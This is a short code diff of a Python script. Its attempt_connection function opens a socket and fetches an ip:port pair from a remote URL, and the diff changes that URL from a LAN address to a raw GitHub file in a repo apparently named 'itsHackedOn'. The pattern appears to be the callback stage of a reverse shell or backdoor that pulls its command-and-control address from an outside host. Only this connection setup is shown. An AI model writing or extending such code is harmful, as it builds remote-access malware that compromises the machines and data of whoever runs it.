@@ -6,7 +6,7 @@ import time
 
 def attempt_connection():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    url = "http://192.168.100.15:8000/raw.txt"
+    url = "https://raw.githubusercontent.com/itsHackedOn/python/refs/heads/main/remote"
     try:
         response = urllib.request.urlopen(url).read().decode().strip()
         ip, port = response.split(":")
